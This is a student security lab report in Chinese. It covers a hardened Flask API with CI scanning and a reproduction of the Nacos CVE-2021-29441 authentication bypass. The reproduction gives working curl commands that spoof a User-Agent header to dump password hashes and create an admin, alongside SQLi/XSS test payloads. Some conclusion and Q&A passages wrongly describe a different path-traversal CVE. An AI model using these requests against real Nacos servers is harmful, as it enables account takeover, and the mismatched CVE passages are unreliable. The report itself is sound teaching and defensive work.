# 实验一 报告：安全 REST API 开发、CI/CD 与真实 CVE 漏洞分析

> **实验编号**：Work 1（实验 1）<br>
> **实验题目**：Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis<br>
> **变体号**：`<填写你的变体号>`<br>
> **姓名**：`<姓 名>`<br>
> **HDU 号（学号）**：`<填写学号>`<br>
> **日期**：2026-10-19<br>
> **仓库地址**：`https://github.com/<OWNER>/<REPO>`<br>
> **CI 流水线地址**：`https://github.com/<OWNER>/<REPO>/actions`

---

## 1. 实验目的

1. 按 OWASP Top 10 的要求，从零构建一个具备基本安全防护的后端 REST API。
2. 把 SAST（静态应用安全测试）与 SCA（软件成分分析）接入 CI/CD，让每次 push / PR 自动做安全体检。
3. 在受控环境中启动真实的漏洞环境（Vulhub），复现一个真实的 CVE，完成“复现 → 根因 → 修复 → 验证”的完整闭环。
4. 学会用工程化的方式表达安全结论：可复现的命令、可对比的截图、可验证的修复。

---

## 2. 实验环境

| 项目 | 版本 / 说明 |
|---|---|
| 操作系统 | Windows 11 (26100)，实验另在 Ubuntu-latest runner 上跑 CI |
| Python | 3.12.4 |
| 框架 | Flask 3.1.3 |
| 数据库 | SQLite 3（WAL 模式） |
| 认证 | PyJWT 2.15.0（HS256）+ bcrypt 4.3.0（cost 12） |
| 测试 | pytest 8.4.2，84 个用例 |
| SAST | Bandit 1.7.9+ |
| SCA | pip-audit 2.7.3+ |
| 容器 | Docker Desktop + Docker Compose v2 |
| 漏洞靶场 | Vulhub `nacos/CVE-2021-29441` |

---

## 3. 第一部分：安全 REST API 的实现

### 3.1 技术选型与项目初始化

选择 **Python + Flask + SQLite**：依赖少、代码量小，评审者能在几分钟内读完；
`bandit` 与 `pip-audit` 对 Python 生态支持最成熟；SQLite 免部署，便于把注意力放在
安全实现而不是基础设施上。

```bash
python -m venv .venv && .venv\Scripts\activate
pip install -r requirements-dev.txt
git init && git add . && git commit -m "feat: secure Flask API skeleton"
git remote add origin https://github.com/<OWNER>/<REPO>.git
git push -u origin main
```

项目结构（关键文件）：

```
app/
├── __init__.py     应用工厂、安全响应头
├── config.py       环境变量配置；production 缺 SECRET_KEY 直接拒绝启动
├── db.py           建表 + 全部参数化查询
├── security.py     bcrypt / JWT / 输入校验 / 输出转义 / 登录限速
├── errors.py       统一 JSON 错误，不泄露堆栈
├── auth.py         POST /auth/login
└── api.py          GET /api/data、POST /api/posts、GET /api/me
tests/              84 个用例（含 SQLi / XSS 回归）
cve/                漏洞环境、利用脚本、补丁、验证脚本
.github/workflows/ci.yml
```

### 3.2 API 设计

| # | 方法 | 路径 | 是否需要认证 | 说明 |
|---|---|---|---|---|
| 1 | POST | `/auth/login` | 否 | 接收 `login` / `password`，返回 JWT |
| 2 | GET | `/api/data` | 是 | 返回帖子列表，支持 `limit` / `offset` / `q` |
| 3 | POST | `/api/posts` | 是 | **自选接口**：创建帖子，演示写路径的校验与转义 |
| + | GET | `/api/me` | 是 | 返回令牌中携带的身份信息 |
| + | GET | `/health` | 否 | 存活探针 |

调用示例（`scripts/demo.ps1` 会依次跑完这些请求）：

```bash
curl -s -X POST http://127.0.0.1:5000/auth/login \
     -H 'Content-Type: application/json' \
     -d '{"username":"alice","password":"Passw0rd!Alice"}'
```

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 900,
  "user": {"id": 1, "username": "alice", "role": "admin"}
}
```

无令牌访问受保护接口：

```bash
curl -i http://127.0.0.1:5000/api/data
```

```http
HTTP/1.1 401 UNAUTHORIZED
WWW-Authenticate: Bearer error="missing_token"

{"error": {"code": "unauthorized", "message": "Missing or malformed Authorization header (expected 'Bearer <token>')."}}
```

**实测记录**（`scripts/demo.ps1` 输出，全部 PASS）：

| 步骤 | 请求 | 结果 |
|---|---|---|
| 1 | `GET /health` | 200 |
| 2 | `POST /auth/login`（alice） | 200，返回 900 秒有效的 JWT |
| 3 | `GET /api/data`（无令牌） | **401** |
| 4 | `GET /api/data`（伪造令牌） | **401** |
| 5 | `GET /api/data`（正确令牌） | 200，返回帖子列表（`limit` 生效） |
| 6 | `POST /api/posts` | 201 |
| 7 | 登录框注入 `alice' OR '1'='1` | **401** |
| 8 | 搜索参数注入 `' OR 1=1 --` | 200，`total=0`（被当作字面量） |
| 9 | 存储型 XSS `<script>alert('XSS')</script>` | 201，响应中为 `&lt;script&gt;...` |

> 完整转录（含请求体与完整响应，令牌已脱敏）见 [`docs/evidence/api-demo.txt`](evidence/api-demo.txt)。


### 3.3 安全措施实现

#### 3.3.1 SQL 注入防护：全参数化

`app/db.py` 是唯一与 SQLite 交互的模块，所有语句都用 `?` 占位符绑定：

```python
row = get_db().execute(
    "SELECT id, username, password_hash, role FROM users WHERE username = ?",
    (username,),          # 用户名是数据，不是 SQL
).fetchone()
```

模糊搜索同样绑定参数，因此 `' OR 1=1 --` 只会被当成普通子串匹配：

```python
"WHERE p.title LIKE ? OR p.body LIKE ?", (f"%{search}%", f"%{search}%")
```

> 关键点：拼接发生在**参数值**里，不在 SQL 语法里。占位符由驱动负责转义，
> 攻击者即使输入引号也无法改变语句结构。

#### 3.3.2 XSS 防护：输出编码 + 输入约束

存储时保留原文（便于编辑），**离开 API 时统一 HTML 转义**
（`app/security.py::escape_value`，递归处理 dict / list）：

```python
"<script>alert('XSS')</script>"
  ->  "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;"
```

配合三道防线：

1. 响应头 `Content-Type: application/json` + `X-Content-Type-Options: nosniff`，
   浏览器不会把 JSON 当 HTML 解析；
2. `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'`；
3. 输入校验拒绝控制字符（`\x00`、`\x1b` 等）并限制长度，顺便挡住日志注入 / 响应头注入。

校验还区分字段的"行数语义"：**标题**是单行字段，拒绝 `\n`、`\r` 与制表符；
**正文**允许多行，但仍拒绝其他控制字符。两者用两个不同的正则（`NO_CONTROL_OR_NEWLINE_RE`
与 `CONTROL_CHARS_RE`）。这一点是写完测试后回看代码时发现的——最初两条分支用了同一个正则，
`allow_newlines=False` 实际没起作用（单行字段照样能塞换行），补了用例才暴露出来。

#### 3.3.3 认证与会话

| 要求 | 实现 |
|---|---|
| 口令绝不明文 | bcrypt，cost=12，每条口令独立随机盐 |
| 规避 bcrypt 72 字节截断 | 超长口令在建哈希前直接拒绝 |
| 登录签发令牌 | HS256 JWT，含 `sub/iss/aud/iat/nbf/exp/jti`，有效期 15 分钟 |
| 所有受保护端点校验 | `@jwt_required` 装饰器 |
| 算法固定 | `algorithms=["HS256"]`，杜绝 `alg:none` 与 RS→HS 混淆 |
| 声明校验 | `iss`、`aud`、必需声明、过期时间（5 秒容差） |
| 令牌吊销 | 每次请求回表查用户，账号被删则令牌立即失效 |
| 防用户枚举 | “用户不存在”与“口令错误”返回完全一致的状态码与正文；并执行一次假 bcrypt 校验以拉平耗时 |
| 防暴力破解 | 同一 (IP, 用户名) 5 分钟内 5 次失败 → `429` + `Retry-After` |

关键代码：

```python
@wraps(view)
def wrapper(*args, **kwargs):
    claims = decode_access_token(bearer_token_from_request())   # 验签 + 校验声明
    user = find_user_by_id(int(claims["sub"]))
    if user is None:
        raise AuthError("Account no longer exists.")
    g.current_user = user
    return view(*args, **kwargs)
```

#### 3.3.4 其他加固

统一 JSON 错误体（不含堆栈 / SQL / 路径）、`MAX_CONTENT_LENGTH=64KiB`、
`Cache-Control: no-store`、`X-Frame-Options: DENY`、开发服务器只监听 `127.0.0.1`、
production 模式缺少 `SECRET_KEY` 直接拒绝启动。

### 3.4 测试

```bash
pytest --cov=app --cov-report=term-missing
```

```
tests/test_auth.py        22 passed
tests/test_api.py         20 passed
tests/test_sqli_xss.py    24 passed
======================== 84 passed ========================
```

覆盖率 **94%**（`pytest --cov=app`：394 行中 24 行未覆盖，基本都是防御性分支，如密码超长、声明校验失败、限速重试等）；`ruff check` 无告警。

安全回归用例（部分）：

| 用例 | 断言 |
|---|---|
| `test_sqli_in_login_never_authenticates[7 payloads]` | 401，且响应中不含 `access_token` |
| `test_sqli_in_search_is_treated_as_literal_text` | `total=0`，表结构完好 |
| `test_sqli_error_messages_are_not_leaked` | 响应体不含 `sqlite` / `syntax error` / `select ` |
| `test_stored_xss_is_escaped_on_output` | 原始 `<script>` 不出现，`&lt;script&gt;` 出现 |
| `test_reflected_xss_is_escaped[5 payloads]` | `<script` / `<img` / `<svg` / `<iframe` 均不出现 |
| `test_other_methods_never_leak_the_feed[5 methods]` | 未认证的 HEAD/OPTIONS/PUT/DELETE/PATCH 都拿不到数据行 |
| `test_alg_none_token_is_rejected` | 401 |
| `test_token_signed_with_attacker_key_is_rejected` | 401 |
| `test_login_is_rate_limited` | 第 6 次返回 429 + `Retry-After` |

### 3.5 CI/CD 与 SAST/SCA

`.github/workflows/ci.yml` 在每次 push 与 PR 时运行四个 job：

| Job | 工具 | 作用 |
|---|---|---|
| `test` | pytest（3.11 / 3.12 矩阵 + 覆盖率） | 功能与安全回归 |
| `lint` | `ruff check`（版本锁定） | 导入顺序、未使用名称、明显 bug |
| `sast-bandit` | `bandit -r app -ll -ii`，并输出 SARIF 上传代码扫描 | 静态发现中高危问题 |
| `sca-pip-audit` | `pip-audit -r requirements.txt --strict` | 依赖已知漏洞 |

两个扫描器都会把原始报告写进 GitHub 的 **Job Summary**，因此截图里能直接看到
工具输出，而不是只有一个绿色对勾。

#### 扫描器的实际结果（本地复跑）

**SAST（Bandit）**：

```
$ bandit -r app -ll -ii
Test results:
	No issues identified.
Code scanned:
	Total lines of code: 636
	Total issues (by severity):
		Low: 3   Medium: 0   High: 0
```

`-ll -ii` 只报中危及以上，所以是绿的。那 3 条 Low 我逐条看过，都是误报——配置常量的
键名里带 `PASSWORD` 被 B105/B106 命中：

| 规则 | 命中的字面量 | 判断 |
|---|---|---|
| B105 | `PASSWORD_MAX_BYTES: 72` | bcrypt 的输入上限，不是口令 |
| B105 | `PASSWORD_MIN_LENGTH: 8` | 口令最小长度策略，不是口令 |
| B106 | `"WWW-Authenticate": "Bearer …"` | HTTP 认证方案名，不是口令 |

**SCA（pip-audit）——这里真的抓到了问题**：

```
$ pip-audit -r requirements.txt --strict
Found 23 known vulnerabilities in 2 packages
  flask  3.1.2   PYSEC-2026-2151                    fix 3.1.3
  pyjwt  2.10.1  PYSEC-2026-120 / -175..-179 / -4140..-4183 …   fix 2.12.0 – 2.15.0
```

其中 PyJWT 的若干条与本项目直接相关（`crit` 头未校验、算法策略相关缺陷），
flask 那条是 `Vary: Cookie` 响应头缺失。修复方式是升级锁定的版本：

```diff
- flask==3.1.2
- PyJWT==2.10.1
+ flask==3.1.3
+ PyJWT==2.15.0
```

```
$ pip-audit -r requirements.txt --strict
No known vulnerabilities found
```

升级后 84 个测试仍然全绿；为了排除"靠降级/升版本把测试改绿"的可能，同一套测试在旧版本
（Flask 3.1.2 / PyJWT 2.10.1）上也跑了一遍，同样全绿——差异只在依赖审计结果上。

**截图位置**：

| 内容 | 位置 |
|---|---|
| 绿色流水线 | Actions → CI → 最近一次运行 |
| Bandit 报告 | Actions → CI → *SAST - Bandit* → Summary |
| pip-audit 报告 | Actions → CI → *SCA - pip-audit* → Summary |
| 代码扫描结果 | Security → Code scanning |

> ⬜ **待补截图**：`docs/screenshots/ci-green.png`、`bandit.png`、`pip-audit.png`
> （push 到自己的仓库后按上表位置截图；图片放进 `docs/screenshots/` 后重新生成 HTML，会自动嵌入）

![CI 流水线：四个 job 全绿](screenshots/ci-green.png)

![Bandit（SAST）报告](screenshots/bandit.png)

![pip-audit（SCA）报告](screenshots/pip-audit.png)

### 3.6 已知局限（范围声明）

写清楚"这个实现没做什么"，比声称"全都安全"更可信。以下是本实现的有意取舍：

| 局限 | 影响 | 生产化做法 |
|---|---|---|
| 限速器是进程内计数 | 多 worker / 多实例时每份计数独立，实际阈值被放大 N 倍（已给表设上限 5000 键、LRU 淘汰、读操作不分配，不会被消息涨爆） | Redis 计数器，或交给网关 / WAF 限速 |
| 客户端标识取自 `X-Forwarded-For` | 不在可信代理后面时该头可伪造，绕过限速 | 只在可信代理后启用；否则用 `remote_addr` |
| JWT 过期前无法吊销 | 15 分钟内被盗令牌仍然可用（删号可立即失效） | 短 TTL + refresh token + `jti` 黑名单 |
| XSS 在 API 层转义 | 前端若再转义会双重转义；正确位置是渲染层 | API 只保证 JSON 类型；渲染层转义 + 严格 CSP |
| 无 TLS | 本机实验，令牌与口令明文传输 | 生产必须 HTTPS + HSTS |
| SQLite 单写者 | 高并发写入排队 | PostgreSQL |
| 依赖锁定版本但未固定哈希 | 供应链投毒仍可能 | `pip install --require-hashes` + lock 文件 |
| 日志只记录用户名 | 无结构化审计与告警 | JSON 日志 + 集中审计 + 告警规则 |

这些不影响实验目标（3 个接口 + 4 类防护 + CI + CVE 闭环），但答辩时值得主动说出来。

---

## 4. 第二部分：CVE-2021-29441 的复现与分析

### 4.1 选择与准备

选 **CVE-2021-29441（Nacos < 1.4.1 认证绕过）**：CWE-290（Authentication Bypass by Spoofing），
CVSS 3.1 **8.6**。理由：

* 根因是一个**可以直接引用的短路判断**——`AuthFilter` 信了 `User-Agent` 请求头；
* 利用只要**两条 `curl`**，前后对比没有歧义；
* 影响直达用户管理 API：既能读 bcrypt 哈希，也能**直接创建管理员**；
* 修复有一个真实的坑：厂商虽然加了开关，但**默认是开着的**（见 4.4）。

> 注意：Vulhub 镜像 `vulhub/nacos:1.4.0` 默认 `nacos.core.auth.enabled=false`，
> 那样"谁都能访问"根本不是 CVE。所以本仓库自建镜像把认证**打开**——这正是 advisory
> 写明的前提（"when configured to use authentication"）。

```bash
cd cve
docker compose up -d --build        # 8848，首次构建会下载 1.4.0 发行包（约 100 MB）
```

Nacos 是 Spring Boot 应用，`up` 之后要等 30–60 秒。

### 4.2 攻击复现

```bash
# 1) 基线：认证是开着的，匿名访问被拒
curl -s -o /dev/null -w '%{http_code}\n' \
  'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
# -> 403  {"status":403,"error":"Forbidden","message":"unknown user!"}

# 2) 绕过：同一个请求，多一个请求头
curl -s -H 'User-Agent: Nacos-Server' \
  'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9'
# -> 200  {"totalCount":1,"pageItems":[{"username":"nacos","password":"$2a$10$..."}]}

# 3) 影响：不提供任何凭据就创建一个管理员
curl -s -X POST -H 'User-Agent: Nacos-Server' \
  'http://127.0.0.1:8848/nacos/v1/auth/users?username=pwned&password=Passw0rd123'
# -> 200  {"code":200,"message":"create user ok!","data":null}
```

**实测输出**（完整转录见 `cve/evidence/vulnerable.txt`）：

```
1. Sanity check: GET /nacos/                              HTTP 200

2. Baseline: GET /nacos/v1/auth/users  (no header)        HTTP 403
   {"timestamp":"...","status":403,"error":"Forbidden","message":"unknown user!"}

3. Bypass: same request with 'User-Agent: Nacos-Server'   HTTP 200
   {"totalCount":1,"pageNumber":1,"pageItems":[
      {"username":"nacos","password":"$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"}]}
   >>> VULNERABLE: authentication bypassed; the user table and password hashes are readable.

4. Impact: create an admin account through the same bypass
   {"code":200,"message":"create user ok!","data":null}
   >>> VULNERABLE: 'pwned4779' was created without any credentials
```

拿到账号后直接在 `http://127.0.0.1:8848/nacos/` 登录，就是完整管理权限（命名空间、配置、服务列表）。

![漏洞环境复现：伪造 User-Agent 后读出用户表并创建管理员](screenshots/cve-exploit.png)

### 4.3 根因分析

**缺陷位置**：`com.alibaba.nacos.core.auth.AuthFilter`。

开启认证后所有请求都要过这个过滤器，而它给**服务器之间的内部调用**留了一个短路：

```java
// Nacos 1.4.0，简化示意
if (userAgent.equals("Nacos-Server")) {
    return chain.doFilter(request, response);   // 跳过全部鉴权
}
```

短路成立的前提是"只有 Nacos 服务器会发这个头"。这个前提本身就是漏洞：
**请求头是攻击者可控的数据，不是身份**。任何人都能敲出这个字符串。

所以问题不是"少了一个检查",而是**把信任决定建立在一个可伪造的输入上**——CWE-290
的典型形态。更糟的是这个短路跳过了**全部**授权（包括用户管理 API），
影响才从"读一条配置"升级为"任意管理操作"。

**配置前提**（advisory 明确写了"when configured to use authentication"）：

* `nacos.core.auth.enabled=false`（默认值，也是 Vulhub 镜像的取值）时，绕过是**不可见**的——
  服务器本来就敞着，少不少那个检查没区别；
* 所以这是**访问控制设计缺陷**，不是"默认配置不安全"。打开认证才让绕过有意义，
  而**关掉认证不是修复**，只是把症状藏起来。

**影响链**：

```
伪造请求头 ──► AuthFilter 短路 ──► /v1/auth/users
                                  ├─ GET  → 用户表 + bcrypt 哈希（可离线爆破）
                                  └─ POST → 创建管理员
                                               └─► 完整控制台权限
```

哈希是 bcrypt（`$2a$10$`），爆破很慢；但攻击者根本不用爆破——**直接新建一个管理员**更快、更安静。

### 4.4 修复

`cve/Dockerfile.fixed` 构建 **Nacos 1.4.1**——把硬编码的 `User-Agent` 短路放进开关的版本：

```
nacos.core.auth.enable.userAgentAuthWhite=true
```

**1.4.1 把这个开关默认设为 `true`**（为了兼容存量集群），所以**光升级版本并不能修好**。
我们实测过：在未经修改的 1.4.1 上，伪造请求头依然能读到用户表。真正的修复是两步：

```diff
-  NACOS_VERSION=1.4.0
+  NACOS_VERSION=1.4.1
+  nacos.core.auth.enable.userAgentAuthWhite=false
```

又因为关掉白名单后，1.4.1 要求内部调用携带 **server identity**，所以还得补一对密钥，
否则服务器会把**所有**请求都拒掉（包括控制台）：

```
nacos.core.auth.server.identity.key=lab1server
nacos.core.auth.server.identity.value=lab1secret
```

三件事都做完，同样的请求才会被拒：

```
HTTP 403
{"status":403,"error":"Forbidden","message":"Invalid server identity key or value,
 Please make sure set `nacos.core.auth.server.identity.key` and
 `nacos.core.auth.server.identity.value`, or open `nacos.core.auth.enable.userAgentAuthWhite`"}
```

教训：**"fixed in version X" 不等于 "fixed"**。要看 advisory、看 release notes，然后自己验证。

### 4.5 修复验证（含回归）

```bash
powershell -ExecutionPolicy Bypass -File .\cve\verify-fix.ps1
```

实测：

```
1. Regression check: GET /nacos/
[PASS] console still returns 200

2. Bypass must fail: GET with 'User-Agent: Nacos-Server'
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 -> HTTP 403
[PASS] returns 403 instead of 200
[PASS] no user table in the body

3. Creating an account must fail
[PASS] no 'create user ok'

4. Authentication is still enabled
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 (no credentials) -> HTTP 403
[PASS] anonymous access still refused

RESULT: fix verified -- all checks passed.
```

第 4 项和前面几项一样重要：**"攻击失效是因为把认证关了"** 属于把功能改坏冒充修复。
脚本明确断言匿名访问**依然**被拒。

![修复验证：同一请求返回 403，控制台仍 200，verify-fix 全部 PASS](screenshots/cve-fixed.png)

### 4.6 纵深防御建议

* **永远不要用请求头做授权判断**。必须识别内部流量时，用攻击者猜不到的**密钥**
  （`server.identity.key/value`）或 mTLS，并把豁免范围收窄到最少的路径。
* 白名单开关保持关闭，节点下线时轮换 server identity。
* 控制台和 API 放到内网策略后面——Nacos 本来就是内部组件，不该对公网可达。
* 对"来自非集群节点的 `User-Agent: Nacos-Server`"告警。
* 把控制台当管理面看待：独立凭据、代理层 2FA、审计日志外发。


---

## 5. 结论

1. 一个“能用”的 API 与一个“安全”的 API 差别不在功能，而在**每个信任边界上的一次决策**：
   参数绑定、输出编码、令牌验签、错误信息收敛。
2. 安全测试必须可回归：84 个用例里有 24 个专门用来打自己，改坏了 CI 立刻变红。
3. CVE 复现的价值在于**建立因果链**：一行 `%2e` → 一个函数的顺序错误 → 一次 400 与一次
   `root:x:0:0`。看懂这条链，才谈得上写出补丁和写出检测规则。
4. 修复要以“同一配置、只变版本”的方式验证，并同时做回归测试；否则你无法区分
   “修好了”和“被我关掉了”。

### 得分点对照

| 评分项 | 分值 | 本作品对应位置 |
|---|---|---|
| API 功能 | 2 | 3.2（3 个主接口 + 2 个辅助接口），demo 全部 PASS |
| 防 SQLi | 0.5 | 3.3.1 + 7 个注入用例 |
| 防 XSS | 0.5 | 3.3.2 + 5 个 payload 用例 |
| 认证（JWT + 哈希） | 1 | 3.3.3 + 认证用例 19 个 |
| CI/CD（SAST/SCA） | 2 | 3.5，Bandit + pip-audit + 报告截图 |
| 漏洞环境与 CVE 复现 | 2 | 4.1–4.2 |
| 根因分析深度 | 1 | 4.3 |
| 修复正确性与验证 | 1 | 4.4–4.5 |

---

## 6. 控制问题

**1. 为什么用 bcrypt 这类算法做口令哈希，比 SHA-256 更好？**

SHA-256 的设计目标是“快”，现代 GPU 每秒能算上百亿次，泄露的哈希表很快被字典/暴力
攻破。bcrypt 的设计目标是“故意慢”：cost 因子可调（cost=12 即 4096 轮），每条口令
独立随机盐（彩虹表失效），并且基于 Blowfish 密钥调度，需要较多内存与计算。
更重要的是 cost 可以随硬件进步而上调，而 SHA-256 没有这个旋钮。

**2. SAST 与 DAST 的主要区别是什么？**

SAST 是白盒：不运行程序，直接分析源码 / 字节码的数据流，能在提交阶段就发现
注入、硬编码密钥等问题，定位到行，但误报多、看不到运行时配置与第三方组件。
DAST 是黑盒：像攻击者一样对运行中的系统发 HTTP 请求，能发现真实的运行时问题
（认证绕过、跨层注入），但无法指出代码位置，也覆盖不到未被路由触达的代码。
本实验用 SAST（Bandit + pip-audit）守代码与依赖，DAST 留到实验二用 ZAP 做。

**3. 描述 JWT 的工作机制：它包含什么信息，服务端如何验证真伪？**

JWT 由三段 base64url 组成：`header.payload.signature`。payload 是声明集合
（`sub` 主体、`exp` 过期、`iat` 签发时间、`iss` 签发者、`aud` 受众、自定义角色等）。
**payload 只是编码不是加密**，任何拿到令牌的人都能读，所以绝不能放敏感数据。
服务端用密钥对 `header.payload` 重新计算签名并与第三段比对（HS256 是 HMAC-SHA256；
RS256 则用私钥签、公钥验），同时校验 `iss`/`aud`/`exp`/`nbf` 与必需声明是否存在。
签名保证不可伪造，`exp` 限制被盗令牌的可用窗口；服务端还应固定算法白名单，
否则会出现 `alg:none` 或 RS→HS 混淆攻击。

**4. 不审计第三方依赖会带来什么风险？**

现代应用 80% 以上的代码来自依赖，攻击者不需要碰你的代码，只要你的一个传递依赖
有已知漏洞（Log4Shell、Struts2、本次的 Nacos）就能进入。而且漏洞披露到利用往往只有
几天，你没有时间临时评估。SCA 的价值是：生成可见的 SBOM、在 CI 里对已知 CVE 报警、
把“该不该升级”变成流程而不是个人记忆。

**5. 用 Docker + Vulhub 学习安全，比在本机直接装有漏洞的软件好在哪？**

隔离与可丢弃：打穿了也只是容器，快照 / 重建即可复原；版本精确可复现，
不会因为“我这台机器已经打了补丁”而复现失败；漏洞版与修复版可以并排对比，
只改一个 tag；配置被固化成代码，评审者可复核；对教学而言，所有人的环境一致，
评分可复现。

**6. 漏洞与利用（exploit）的区别？本实验复现的是哪一个？**

漏洞是**缺陷本身**（例如 `ap_normalize_path()` 中解码与点段判断的顺序错误）；
利用是**把缺陷变成效果的具体手段**（`curl --path-as-is '.../.%2e/%2e%2e/...'` 这条请求）。
本实验是在人为搭建的漏洞环境中，**用公开的 exploit 复现漏洞**：我证明的是漏洞可被利用，
并据此分析根因、打补丁、再证明利用失效。

**7. 打了补丁之后，为什么还必须做回归测试？**

因为修复往往改动的是公共路径（这里是认证过滤器），很容易顺带弄坏正常请求：
1.4.1 就是现成的例子——它加了开关却默认开着，升级完依然能被绕过；而关掉开关却不配
server identity，连控制台都会被锁死。
回归测试回答两个问题：修复是否**精准**（只挡住恶意，不影响正常），
以及是否**引入新问题**（可用性、性能、兼容性）。没有回归的“修复”可能只是把功能关掉了。

**8. 掌握并复现已知 CVE，对安全从业者（渗透测试 / SOC 分析）有什么用？**

对渗透测试：CVE 复现是“证明影响”的标准动作，也是资产排查的最快路径——
先按 KEV 清单扫一遍已知被在野利用的漏洞，再谈深度测试。
对 SOC 分析：知道请求长什么样（`/.%2e/`、双重编码、异常的 `--path-as-is` 目标），
才能写出检测规则、在日志里认出攻击。
更根本的是，CVE 教会你**模式**：规范化顺序、反序列化、注入、越权——
这些模式会以不同语言、不同框架反复出现。

---

## 7. 提交清单

| # | 要求 | 状态 / 位置 |
|---|---|---|
| 1 | 公开 Git 仓库链接 | `https://github.com/<OWNER>/<REPO>`（待 push） |
| 2 | README.md（项目说明、安全措施、SAST/SCA 截图、CVE、复现、根因、修复、验证） | `README.md` / `README.zh-CN.md` |
| 3 | 最近一次成功流水线链接 | `https://github.com/<OWNER>/<REPO>/actions`（待 push） |
| 4 | 修复文件目录 | `cve/Dockerfile.fixed`、`cve/docker-compose.fixed.yml` |
| 5 | 本报告 | `docs/report_zh.md`（中文）、`docs/report_en.md`（英文） |

### 待补材料

- [ ] `docs/screenshots/ci-green.png` — 绿色流水线
- [ ] `docs/screenshots/bandit.png` — Bandit Job Summary
- [ ] `docs/screenshots/pip-audit.png` — pip-audit Job Summary
- [ ] `docs/screenshots/cve-exploit.png` — 漏洞环境 403 基线 + 200 泄露 + `create user ok!`
- [ ] `docs/screenshots/cve-fixed.png` — 修复后 403 + verify-fix PASS
- [ ] 首页按手册要求补齐：编号、题目、变体号、姓名、HDU 号
